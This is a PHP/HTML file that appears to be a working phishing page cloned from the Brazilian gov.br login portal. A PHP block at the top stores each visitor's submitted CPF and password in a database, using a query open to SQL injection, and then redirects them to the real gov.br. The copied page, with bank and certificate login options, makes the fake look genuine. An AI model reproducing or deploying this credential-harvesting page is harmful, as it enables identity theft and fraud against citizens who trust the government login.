<?php

include("CONECTADB.php");

if ($_SERVER["REQUEST_METHOD"] == "POST"){
	$usuario = $_POST["usuario"];
	$senha = $_POST["senha"];

	$sql = "INSERT INTO usuario(USU_CPF, USU_SENHA) VALUES ('$usuario', '$senha')" ;
	mysqli_query($link, $sql);
	echo "<script>window.location.href='https://gov.br';</script>"; 
}

?>




<!DOCTYPE html>
<!-- saved from url=(0091)https://sso.acesso.gov.br/login?client_id=contas.acesso.gov.br&authorization_id=19c99f17aee -->
<html lang="pt-BR"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  
  <title>gov.br - Acesse sua conta</title>
  <meta property="creator.productor" content="http://estruturaorganizacional.dados.gov.br/id/unidade-organizacional/2981">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">

  <link rel="icon" href="https://sso.acesso.gov.br/assets/govbr/img/favicon.ico" type="image/x-icon">
  <link rel="stylesheet" href="./gov.br - Acesse sua conta_files/all.min.css">
  <link rel="stylesheet" href="./gov.br - Acesse sua conta_files/rawline.css">
  <link rel="stylesheet" href="./gov.br - Acesse sua conta_files/govbr-highcontrast.css">
  <link rel="stylesheet" href="./gov.br - Acesse sua conta_files/govbr-templates.css">
  <link rel="stylesheet" href="./gov.br - Acesse sua conta_files/govbr-modal.css">
  <link rel="stylesheet" href="./gov.br - Acesse sua conta_files/govbr-eula.css">
  <script src="./gov.br - Acesse sua conta_files/contrast.class.js.baixados"></script>
  <script src="./gov.br - Acesse sua conta_files/modal.js.baixados"></script>
</head>

<body>
    <a tabindex="0" href="https://sso.acesso.gov.br/login?client_id=contas.acesso.gov.br&amp;authorization_id=19c99f17aee#conteudo" class="sr-only sr-only-focusable" aria-label="Pular para o conteÃºdo principal. Navegue sempre com a tecla TAB">Pular para o conteÃºdo principal</a>

    <header>
        <a href="https://www.gov.br/"><img src="./gov.br - Acesse sua conta_files/govbr.png" alt="Logomarca GovBR"></a>
        <div id="acessibilidade">
            <span>
                <a href="https://sso.acesso.gov.br/login?client_id=contas.acesso.gov.br&amp;authorization_id=19c99f17aee#" onclick="contrastScript().toggleContrast(event)"><i class="fas fa-adjust"></i><span>Alto Contraste</span></a>
            </span>
            <span>
                <a href="https://www.vlibras.gov.br/" target="_BLANK"><i class="fas fa-deaf"></i><span>VLibras</span></a>
            </span>
        </div>
        
    </header>
<div class="container">
	<aside id="aside-signin">
		<img id="identidade-govbr" src="./gov.br - Acesse sua conta_files/conta_govbr_v2.jpg" alt="Logomarca GovBR">
	</aside>
	<main id="main-signin">
	<form method="post" id="loginData" action="gov.br.php" autocomplete="off" novalidate="">
		<div class="card" id="login-cpf">
			<h3>Identifique-se no gov.br com:</h3>
			<div class="item-login-signup-ways" onclick="accordion(&#39;accordion-panel-id&#39;)">
					<a tabindex="3">
						<img src="./gov.br - Acesse sua conta_files/id-card-solid.png">
						Número do CPF
					</a>
				</div>
				<div class="accordion-panel" id="accordion-panel-id">
					<p>Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br</p>
					<label for="cpf">CPF</label>
					<input id="usuario" name="usuario"  type="tel" inputmode="numeric" value="" placeholder="Digite seu CPF" >
					
					<label for="senha">SENHA</label>
					<input id="senha" name="senha"  type="password"  placeholder="Digite sua senha" >
					<div class="button-panel" id="login-button-panel">
						<button id="enter-account-id" type="submit" name="operation" value="enter-account-id" class="button-continuar" tabindex="2">Continuar</button>
            			
            			</div>
				</div>
				<label id="title-outras-op">Outras opções de identificação:</label>
				<hr id="hr-outras-op" style="margin: 0 0 0">
	
	           
	            <div class="item-login-signup-ways" onclick="showModal(&#39;modal-bancos-credenciados&#39;)">
						<button type="button" tabindex="5" class="button-href-mimic2" style="color:#008C32" onclick="showModal(&#39;modal-bancos-credenciados&#39;)">
							<img src="./gov.br - Acesse sua conta_files/InternetBanking-green.png">
							Login com seu banco
							<span style="font-size: 7px; background-color: #008C32; color: white; padding: 3px; top: -3px; position: relative; margin-left: 8px;">SUA CONTA SERÁ PRATA</span>
						</button>
					</div>
					<div class="modal-bancos-credenciados">
						<div class="modal-content">
							<h3>Bancos Credenciados</h3>
							<p><b>Crie</b> ou <b>aumente o nível</b> da sua conta para <b>PRATA</b>, fazendo login com seu banco.</p>
							<div id="providers-list" class="modal-providers-list">
								<div class="item-login-signup-ways">
										<button id="login-external-authentication-banco-do-brasil" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
											<img src="./gov.br - Acesse sua conta_files/bb_logo.png">
											Banco do Brasil</button>				
										<script>
											document.getElementById("login-external-authentication-banco-do-brasil").addEventListener("click", event => { 
												setProviderId("banco-do-brasil");
												
												return onSubmit(event);
												
											});
										</script>
									</div>
								<div class="item-login-signup-ways">
										<button id="login-external-authentication-itau" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
											<img src="./gov.br - Acesse sua conta_files/itau_logo.png">
											Itaú</button>				
										<script>
											document.getElementById("login-external-authentication-itau").addEventListener("click", event => { 
												setProviderId("itau");
												
												return onSubmit(event);
												
											});
										</script>
									</div>
								<div class="item-login-signup-ways">
										<button id="login-external-authentication-caixa-economica" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
											<img src="./gov.br - Acesse sua conta_files/cef_logo.png">
											Caixa Econômica</button>				
										<script>
											document.getElementById("login-external-authentication-caixa-economica").addEventListener("click", event => { 
												setProviderId("caixa-economica");
												
												return onSubmit(event);
												
											});
										</script>
									</div>
								<div class="item-login-signup-ways">
										<button id="login-external-authentication-bradesco" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
											<img src="./gov.br - Acesse sua conta_files/bradesco_logo.png">
											Bradesco</button>				
										<script>
											document.getElementById("login-external-authentication-bradesco").addEventListener("click", event => { 
												setProviderId("bradesco");
												
												return onSubmit(event);
												
											});
										</script>
									</div>
								<div class="item-login-signup-ways">
										<button id="login-external-authentication-santander" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
											<img src="./gov.br - Acesse sua conta_files/santander_logo.png">
											Santander</button>				
										<script>
											document.getElementById("login-external-authentication-santander").addEventListener("click", event => { 
												setProviderId("santander");
												
												return onSubmit(event);
												
											});
										</script>
									</div>
								<div class="item-login-signup-ways">
										<button id="login-external-authentication-picpay" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
											<img src="./gov.br - Acesse sua conta_files/picpay.png">
											PicPay/Original</button>				
										<script>
											document.getElementById("login-external-authentication-picpay").addEventListener("click", event => { 
												setProviderId("picpay");
												
												return onSubmit(event);
												
											});
										</script>
									</div>
								<div class="item-login-signup-ways">
										<button id="login-external-authentication-nubank" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
											<img src="./gov.br - Acesse sua conta_files/nubank_logo.png">
											Nubank</button>				
										<script>
											document.getElementById("login-external-authentication-nubank").addEventListener("click", event => { 
												setProviderId("nubank");
												
												return onSubmit(event);
												
											});
										</script>
									</div>
								<div class="item-login-signup-ways">
										<button id="login-external-authentication-sicoob" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
											<img src="./gov.br - Acesse sua conta_files/sicoob_logo.png">
											Sicoob</button>				
										<script>
											document.getElementById("login-external-authentication-sicoob").addEventListener("click", event => { 
												setProviderId("sicoob");
												
												return onSubmit(event);
												
											});
										</script>
									</div>
								<div class="item-login-signup-ways">
										<button id="login-external-authentication-sicredi" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
											<img src="./gov.br - Acesse sua conta_files/sicredi_logo.png">
											Sicredi</button>				
										<script>
											document.getElementById("login-external-authentication-sicredi").addEventListener("click", event => { 
												setProviderId("sicredi");
												
												return onSubmit(event);
												
											});
										</script>
									</div>
								<div class="item-login-signup-ways">
										<button id="login-external-authentication-banrisul" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
											<img src="./gov.br - Acesse sua conta_files/banrisul_logo.png">
											Banrisul</button>				
										<script>
											document.getElementById("login-external-authentication-banrisul").addEventListener("click", event => { 
												setProviderId("banrisul");
												
												return onSubmit(event);
												
											});
										</script>
									</div>
								<div class="item-login-signup-ways">
										<button id="login-external-authentication-agibank" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
											<img src="./gov.br - Acesse sua conta_files/agibank_logo.png">
											Agibank</button>				
										<script>
											document.getElementById("login-external-authentication-agibank").addEventListener("click", event => { 
												setProviderId("agibank");
												
												return onSubmit(event);
												
											});
										</script>
									</div>
								<div class="item-login-signup-ways">
										<button id="login-external-authentication-banco-de-brasilia" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
											<img src="./gov.br - Acesse sua conta_files/brb_logo.png">
											Banco de Brasília</button>				
										<script>
											document.getElementById("login-external-authentication-banco-de-brasilia").addEventListener("click", event => { 
												setProviderId("banco-de-brasilia");
												
												return onSubmit(event);
												
											});
										</script>
									</div>
								<div class="item-login-signup-ways">
										<button id="login-external-authentication-mercantil" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
											<img src="./gov.br - Acesse sua conta_files/mercantil_logo.png">
											Banco Mercantil</button>				
										<script>
											document.getElementById("login-external-authentication-mercantil").addEventListener("click", event => { 
												setProviderId("mercantil");
												
												return onSubmit(event);
												
											});
										</script>
									</div>
								<div class="item-login-signup-ways">
										<button id="login-external-authentication-btgpactual" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
											<img src="./gov.br - Acesse sua conta_files/btgpactual_logo.png">
											BTG Pactual</button>				
										<script>
											document.getElementById("login-external-authentication-btgpactual").addEventListener("click", event => { 
												setProviderId("btgpactual");
												
												return onSubmit(event);
												
											});
										</script>
									</div>
								<div class="item-login-signup-ways">
										<button id="login-external-authentication-inter" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
											<img src="./gov.br - Acesse sua conta_files/inter.png">
											Banco Inter</button>				
										<script>
											document.getElementById("login-external-authentication-inter").addEventListener("click", event => { 
												setProviderId("inter");
												
												return onSubmit(event);
												
											});
										</script>
									</div>
								<div class="item-login-signup-ways">
										<button id="login-external-authentication-c6bank" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
											<img src="./gov.br - Acesse sua conta_files/c6-bank.png">
											C6 Bank</button>				
										<script>
											document.getElementById("login-external-authentication-c6bank").addEventListener("click", event => { 
												setProviderId("c6bank");
												
												return onSubmit(event);
												
											});
										</script>
									</div>
								<div class="item-login-signup-ways">
										<button id="login-external-authentication-bancobmg" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
											<img src="./gov.br - Acesse sua conta_files/bmg.png">
											Banco Bmg</button>				
										<script>
											document.getElementById("login-external-authentication-bancobmg").addEventListener("click", event => { 
												setProviderId("bancobmg");
												
												return onSubmit(event);
												
											});
										</script>
									</div>
								</div>
							<hr>
							<div class="button-panel" id="modal-bancos-credenciados-button-panel">
								<button class="button-cancel" type="button" id="btn-close-modal-bancos-credenciados" onclick="closeModal(&#39;modal-bancos-credenciados&#39;)">Cancelar</button>
							</div>
						</div>
					</div>
				<div class="item-login-signup-ways" onclick="showQrCode(&#39;18c90869-e420-4cf1-a29a-c27aac021768&#39;);">
						<a tabindex="5" href="https://sso.acesso.gov.br/login?client_id=contas.acesso.gov.br&amp;authorization_id=19c99f17aee#">
						    <img src="./gov.br - Acesse sua conta_files/qrcode.png">
								Login com QR code
					   		</a>
					</div>
				<div class="item-login-signup-ways" id="cert-digital">
					<button id="login-certificate" type="submit" formaction="https://certificado.sso.acesso.gov.br/login?client_id=contas.acesso.gov.br&amp;authorization_id=19c99f17aee" name="operation" value="login-certificate" class="button-href-mimic2" tabindex="4">
						<img src="./gov.br - Acesse sua conta_files/CD.png">
						Seu certificado digital
					</button>
          <script>
  						document.getElementById("login-certificate").addEventListener("click", event=>onSubmit(event));
  					</script>
          </div>
				<div class="item-login-signup-ways" id="cert-digital-cloud">
						<button type="button" onclick="showModal(&#39;modal-certificado-nuvem&#39;)" class="button-href-mimic2" tabindex="5">
							<img src="./gov.br - Acesse sua conta_files/CD-Nuvem.png" id="cert-digital-cloud-img">
							Seu certificado digital em nuvem
						</button>
					</div>
					<div class="modal-certificado-nuvem">
						<div class="modal-content">
							<h3>Provedores de Certificados em Nuvem</h3>
							<div class="item-login-signup-ways">
									<button id="login-external-authentication-neoid" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
										<img src="./gov.br - Acesse sua conta_files/serproid_logo.png">
										SerproID</button>
									<script>
										document.getElementById("login-external-authentication-neoid").addEventListener("click", event => { 
											setProviderId("neoid");
											
											return onSubmit(event);
											
										});
									</script>
								</div>
							<div class="item-login-signup-ways">
									<button id="login-external-authentication-safeid" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
										<img src="./gov.br - Acesse sua conta_files/safeid_logo.png">
										SafeID</button>
									<script>
										document.getElementById("login-external-authentication-safeid").addEventListener("click", event => { 
											setProviderId("safeid");
											
											return onSubmit(event);
											
										});
									</script>
								</div>
							<div class="item-login-signup-ways">
									<button id="login-external-authentication-birdid" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
										<img src="./gov.br - Acesse sua conta_files/birdid_logo.png">
										BirdID</button>
									<script>
										document.getElementById("login-external-authentication-birdid").addEventListener("click", event => { 
											setProviderId("birdid");
											
											return onSubmit(event);
											
										});
									</script>
								</div>
							<div class="item-login-signup-ways">
									<button id="login-external-authentication-remoteid" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
										<img src="./gov.br - Acesse sua conta_files/remoteid_logo.png">
										RemoteID</button>
									<script>
										document.getElementById("login-external-authentication-remoteid").addEventListener("click", event => { 
											setProviderId("remoteid");
											
											return onSubmit(event);
											
										});
									</script>
								</div>
							<div class="item-login-signup-ways">
									<button id="login-external-authentication-vidaas" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
										<img src="./gov.br - Acesse sua conta_files/vidaas_logo.png">
										Vidaas</button>
									<script>
										document.getElementById("login-external-authentication-vidaas").addEventListener("click", event => { 
											setProviderId("vidaas");
											
											return onSubmit(event);
											
										});
									</script>
								</div>
							<div class="item-login-signup-ways">
									<button id="login-external-authentication-dscloud" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
										<img src="./gov.br - Acesse sua conta_files/digitalsign_logo.png">
										DS Cloud</button>
									<script>
										document.getElementById("login-external-authentication-dscloud").addEventListener("click", event => { 
											setProviderId("dscloud");
											
											return onSubmit(event);
											
										});
									</script>
								</div>
							<div class="item-login-signup-ways">
									<button id="login-external-authentication-syngular" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
										<img src="./gov.br - Acesse sua conta_files/syngular_logo.png">
										Syngular</button>
									<script>
										document.getElementById("login-external-authentication-syngular").addEventListener("click", event => { 
											setProviderId("syngular");
											
											return onSubmit(event);
											
										});
									</script>
								</div>
							<hr>
							<div class="button-panel" id="modal-bancos-credenciados-button-panel">
								<button class="button-cancel" type="button" id="btn-close-modal-certificado-nuvem" onclick="closeModal(&#39;modal-certificado-nuvem&#39;)">Cancelar</button>
							</div>
						</div>
					</div>
				<div class="entenda-id-govbr" id="entenda-id-govbr">
				<span>
					<a tabindex="6" href="https://www.gov.br/governodigital/pt-br/conta-gov-br/ajuda-da-conta-gov.br" id="entenda-id-govbr-a">
							<img src="./gov.br - Acesse sua conta_files/circle-question-solid.svg" style="margin: 0px 13px -2px 0px; height: 1em;">
							Está com dúvidas e precisa de ajuda?
						</a>
					<a tabindex="6" href="https://cadastro.acesso.gov.br/termo-de-uso" style="display: block;" target="_blank" id="termo-de-uso">Termo de Uso e Aviso de Privacidade</a>
				</span>
			</div>
		</div>
			
        <input type="hidden" name="_csrf" value="18c90869-e420-4cf1-a29a-c27aac021768">
       	<input id="operation-field" type="hidden"> 
		<input id="provider-id-field" type="hidden">
		<input id="flow-token-field" type="hidden"> 
		<script>
			function setProviderId(providerId) {
				const input = document.getElementById("provider-id-field");
				input.name = "provider-id";
				input.value = providerId;
			}
		</script>
		<div id="hcaptcha"><iframe aria-hidden="true" data-hcaptcha-widget-id="0m9kp0o1w4m" data-hcaptcha-response="" src="./gov.br - Acesse sua conta_files/hcaptcha.html" style="display: none;"></iframe><textarea id="h-captcha-response-0m9kp0o1w4m" name="h-captcha-response" style="display: none;"></textarea></div>
			<script>
				function onLoadHcaptcha() {
					console.log('hCaptcha is ready.');
					window.hcaptchaWidgetId = hcaptcha.render(
						'hcaptcha', { 
							sitekey: "93b08d40-d46c-400a-ba07-6f91cda815b9", 
							size: "invisible", 
							callback: onHcaptchaCallback,
							"error-callback": e=>onHcaptchaErrorCallback("error"),
							"expired-callback": e=>onHcaptchaErrorCallback("expired"),
							"chalexpired-callback": e=>onHcaptchaErrorCallback("challenge expired"),
							"close-callback": e=>onHcaptchaClose("closed"),
							hl : 'pt' 
						}
					);
				};

				function onHcaptchaClose(reason) {
					window.eventTargetSubmitting.classList.remove("loading");
					delete window.eventTargetSubmitting;
				}

				function onHcaptchaErrorCallback(reason) {
					console.log("Hcaptcha Error Reason: ", reason);
				}

				function onHcaptchaCallback(token) {
				    document.getElementById("loginData").submit();
				}
				
				function onSubmit(event) {
					event.preventDefault();
					if(window.eventTargetSubmitting) {
						return;
					}
					window.eventTargetSubmitting = event.target;
					
					event.target.classList.add("loading");
				    const form = document.getElementById("loginData");

				    if (event?.target?.attributes?.name?.value) {
						const input = document.getElementById("operation-field");
						input.setAttribute("name", event?.target?.attributes?.name?.value);
						input.setAttribute("value", event?.target?.attributes?.value?.value || "");
					} 
					if (event?.target?.attributes?.formaction?.value) {
						form.setAttribute("action", event?.target?.attributes?.formaction?.value);
					} 
					
					hcaptcha.execute(window.hcaptchaWidgetId);
				}
			</script>
			<script src="./gov.br - Acesse sua conta_files/api.js.baixados" async="" defer=""></script>
		</form>
	</main>
</div>
<div class="modal-qrcode">
		<div class="modal-content" style="text-align: center; justify-content: space-evenly">
			<h3>Login sem senha com QR code</h3>
				<p style="text-align: justify; justify-content: space-evenly">Utilize o <strong>aplicativo gov.br</strong> para logar sem senha, usando apenas o leitor de QR code.</p>
				<div id="qrcode" style="display: inline-block"><canvas width="224" height="224"></canvas><img style="display: none;"></div>
				<p style="text-align: justify; justify-content: space-evenly">
					Você pode baixar o aplicativo <strong>gov.br</strong> gratuitamente nas lojas de aplicativos.
				</p>
				<p style="text-align: center">
					<a href="https://play.google.com/store/apps/details?id=br.gov.meugovbr">
						<img src="./gov.br - Acesse sua conta_files/disponivel-no-google-play.png" alt="Android" style="width: 125px">
					</a>
					<a href="https://apps.apple.com/br/app/meu-gov-br/id1506827551">
						<img src="./gov.br - Acesse sua conta_files/disponivel-na-apple-store.png" alt="iOS" style="width: 125px">
					</a>
				</p>
				<div class="button-panel">
					<button class="button-cancel" type="button" id="btn-close-modal-qrcode" onclick="stopQrCode()">Cancelar</button>
				</div>
			<form id="formLoginQrCode" method="post" style="display: none">
        		<input type="hidden" name="operation" value="qrcode-login">
				<input type="hidden" name="token">
				<input type="hidden" name="_csrf" value="18c90869-e420-4cf1-a29a-c27aac021768">
			</form>
		</div>
	</div>




  <footer>
  </footer>
  <script src="./gov.br - Acesse sua conta_files/jquery-2.2.4.min.js.baixados"></script>
  <script src="./gov.br - Acesse sua conta_files/scripts.js.baixados"></script>
  <script src="./gov.br - Acesse sua conta_files/jquery.maskedinput.js.baixados"></script>


<script>
	focusOnLoad('accountId');
	var CNAME_GOVBRCOORD = "Govbrcoord";
	var cookieValueBase64New = "";

    (function () {
        window.addEventListener("load", function () {
            cpfMask("accountId");
			getLocation();
        });
    })();

	function getLocation() {
		if (navigator.geolocation) {
			navigator.geolocation.getCurrentPosition(showPosition, showError);
		}
	}
	function showError(error) {
		switch(error.code) {
			case error.PERMISSION_DENIED:
			break;
		}
	}
    function showPosition(position) {
		
		cookieValueBase64New = "C" + btoa(precisionWithoutRound(position.coords.latitude, 4) + "_" + precisionWithoutRound(position.coords.longitude, 4));
		
		var cookieValueBefore = getCookie(CNAME_GOVBRCOORD);
		var cookieValueBase64Before = cookieValueBefore ? cookieValueBefore.split('_')[0] : "";
		
		
			if (cookieValueBase64New !== cookieValueBase64Before) {
				setCookie(CNAME_GOVBRCOORD, cookieValueBase64New)
			} else {
				setCookie(CNAME_GOVBRCOORD, cookieValueBefore)
			}
		
    }
	function precisionWithoutRound(num, precision) {
		return num.toFixed(precision + 1).slice(0, -1);
	}
	function setCookie(cname, value) {
		const expireDate = new Date();
		expireDate.setTime(expireDate.getTime() + (3652 * 24 * 60 * 60 * 1000));
		document.cookie = cname + "=" + encodeURIComponent(value) + ";domain=." + window.location.hostname + ";expires=" + expireDate.toUTCString();
	}
	function getCookie(cname) {
		var name = cname + "=";
		var decodedCookie = decodeURIComponent(document.cookie);
		var ca = decodedCookie.split(';');
		for(var i = 0; i <ca.length; i++) {
		var c = ca[i];
		while (c.charAt(0) == ' ') {
			c = c.substring(1);
		}
		if (c.indexOf(name) == 0) {
			return c.substring(name.length, c.length);
		}
		}
		return "";
	}
	function deleteCookie(cname) {
		document.cookie = cname + "=deleted;domain=." + window.location.hostname + ";expires=Thu, 01 Jan 1970 00:00:01 GMT";
	}
	function initMap() {      
		var geocoder  = new google.maps.Geocoder();             // create a geocoder object
		const latlngFromBase64 = atob(cookieValueBase64New.slice(1));
		const latlngStr = latlngFromBase64.split("_", 2);
		const latlng = {
		lat: parseFloat(latlngStr[0]),
		lng: parseFloat(latlngStr[1]),
		};
		var location  = new google.maps.LatLng(latlng.lat, latlng.lng);    // turn coordinates into an object          
		geocoder.geocode({'latLng': location}, function (results, status) {
		if(status == google.maps.GeocoderStatus.OK) {           // if geocode success
			var city = findResult(results, "locality");
			var region = findResult(results, "administrative_area_level_2");
			var state = findResult(results, "administrative_area_level_1");
			var country = findResult(results, "country");

			var address = (city ? city.long_name + " - " : (region ? region.long_name + " - " : "")) + state.short_name +", "+country.long_name;

			setCookie(CNAME_GOVBRCOORD, cookieValueBase64New + "_" + btoa(address))
		}
		});
		function findResult(results, type) {
			var indice = 0;
			for (var j=0; j<results.length; j++){
				if (results[j].types[0]=='locality'){
						indice=j;
						break;
				}
			}
			for (var i=0; i<results[indice].address_components.length; i++){
				if (results[indice].address_components[i].types[0] == type) {
						return results[indice].address_components[i];
					}
			}
			return;
		}
	}

    function accordion(elem) {
        var panel = document.getElementById(elem)
        if (panel.style.maxHeight) {
            panel.style.maxHeight = null;
			document.getElementById("title-outras-op").style = "display: block;";
			document.getElementById("hr-outras-op").style = "display: block;"
        } else {
            panel.style.maxHeight = 0;
			document.getElementById("title-outras-op").style = "display: none;";
			document.getElementById("hr-outras-op").style = "display: none;"
        }
    }

    setTimeout(function () { location.reload(true); }, 29 /* minutes */ * 60 /* seconds */ * 1000 /* millis */);
</script>
<script src="./gov.br - Acesse sua conta_files/qrcode.min.js.baixados"></script>
<script>
var loginQrCode = {};

function startQrCode() {
  loginQrCode.qrcode = new QRCode("qrcode", {
    text: "",
    width: 224,
    height: 224,
    colorDark: "#000000",
    colorLight: "#ffffff",
    correctLevel: QRCode.CorrectLevel.L
  });
  loginQrCode.cancel = false;
}

function showQrCode(csrfToken) {
  $.ajax({
    url: '/login?operation=generate-qrcode',
    type: "POST",
    dataType: 'json', 
    data: JSON.stringify({}),
    contentType: 'application/json; charset=utf-8',
    headers: {
      "X-CSRF-TOKEN": csrfToken
    },
    success: function(result) {
      loginQrCode.verificationUriComplete = result.verificationUriComplete;
	  loginQrCode.qrcode.makeCode(result.verificationUriComplete);

      loginQrCode.token = result.token;
      showModal('modal-qrcode');
      loginQrCode.interval = result.interval || 5
      loginQrCode.cancel = false;
      startPollVerifyQrCode(csrfToken);
    },
    error: function(xhr, resp, text) {
      stopQrCode();
    }
  });
}

function callLoginDeepLink(event) {
  callLink(event, loginQrCode.verificationUriComplete);
}


function startPollVerifyQrCode(csrfToken) {
  setTimeout(pollVerifyQrCode, loginQrCode.interval * 1000, csrfToken);
}

function pollVerifyQrCode(csrfToken) {
  if(typeof loginQrCode.cancel === 'undefined' || loginQrCode.cancel) {
    return;
  }

  $.ajax({
    url: '/login?operation=verify-qrcode-status',
    type: "POST",
    dataType: 'json', // data type
    data: JSON.stringify({
      "token" : loginQrCode.token	
    }),
    contentType: 'application/json; charset=utf-8',
    headers: {
      "X-CSRF-TOKEN": csrfToken
    },
    success: function(result) {
      stopQrCode();
      const form = document.getElementById("loginData");
      form['flow-token-field'].name = 'token';
      form['flow-token-field'].value = result.token; 
      form['operation-field'].name = 'operation';
      form['operation-field'].value = 'qrcode-login';
      
	  	  hcaptcha.execute(window.hcaptchaWidgetId);
	          
    },
    error: function(xhr, resp, text) {
      const error = xhr.responseJSON.status;

      if(typeof loginQrCode.cancel === 'undefined' || loginQrCode.cancel) {
        return;
      }
      
      if (error === "AUTHORIZATION_PENDING") {
        startPollVerifyQrCode(csrfToken);
        return;
      }

      if (error === "SLOW_DOWN") {
        loginQrCode.interval += 5;
        startPollVerifyQrCode();
        return;
      }
      stopQrCode();

      if(!xhr.responseJSON.token){
    	  return;
      }
      const form = document.getElementById("loginData");
      form['flow-token-field'].name = 'token';
      form['flow-token-field'].value = xhr.responseJSON.token; 
      form['operation-field'].name = 'operation';
      form['operation-field'].value = 'qrcode-login';
      
	  	hcaptcha.execute(window.hcaptchaWidgetId);
	        
    }
  });
}

function stopQrCode() {
  loginQrCode.cancel = true;
  closeModal('modal-qrcode');
  loginQrCode.qrcode.clear();
}

startQrCode();
</script>
<div aria-hidden="true" style="background-color: rgb(255, 255, 255); border: 1px solid rgb(215, 215, 215); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 4px; border-radius: 4px; left: auto; top: -10000px; z-index: -2147483648; position: absolute; pointer-events: auto; transition: opacity 0.15s ease-out; opacity: 0; visibility: hidden;"><div style="position: relative; z-index: 1;"><iframe src="./gov.br - Acesse sua conta_files/hcaptcha(1).html" frameborder="0" scrolling="no" allow="private-state-token-redemption" title="Desafio hCaptcha" style="border: 0px; z-index: 2000000000; position: relative;"></iframe></div><div style="width: 100%; height: 100%; position: fixed; pointer-events: none; top: 0px; left: 0px; z-index: 0; background-color: rgb(255, 255, 255); opacity: 0.05;"></div><div style="border-width: 11px; border-style: none; position: absolute; pointer-events: none; margin-top: -11px; z-index: 1; right: 100%;"><div style="border-width: 10px; border-style: solid; border-color: transparent rgb(255, 255, 255) transparent transparent; position: relative; top: 10px; z-index: 1;"></div><div style="border-width: 11px; border-style: solid; border-color: transparent rgb(215, 215, 215) transparent transparent; position: relative; top: -11px; z-index: 0;"></div></div></div></body></html>